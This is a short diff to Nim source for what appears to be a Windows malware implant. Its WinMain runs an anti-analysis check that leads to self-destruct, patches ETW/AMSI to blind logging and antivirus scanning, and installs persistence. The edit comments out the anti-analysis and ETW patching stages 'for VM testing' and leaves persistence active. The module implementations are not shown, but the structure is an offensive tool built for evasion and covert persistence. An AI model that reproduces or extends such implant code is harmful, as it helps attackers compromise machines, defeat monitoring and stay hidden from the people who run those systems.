@@ -16,12 +16,12 @@ const SLEEP_KEY: array[16, byte] = [
 ]
 
 proc WinMain() {.exportc: "WinMain", stdcall.} =
-  # 1. Anti-analysis gate
-  if antidetect.hostileEnvironment():
-    selfdestruct.fullDestruct()
+  # 1. Anti-analysis gate — disabled for VM testing
+  # if antidetect.hostileEnvironment():
+  #   selfdestruct.fullDestruct()
 
-  # 2. ETW / AMSI patching
-  etw_patch.patchEtw()
+  # 2. ETW / AMSI patching — disabled: don't tamper with logs
+  # etw_patch.patchEtw()
 
   # 3. Persistence
   persist.install()
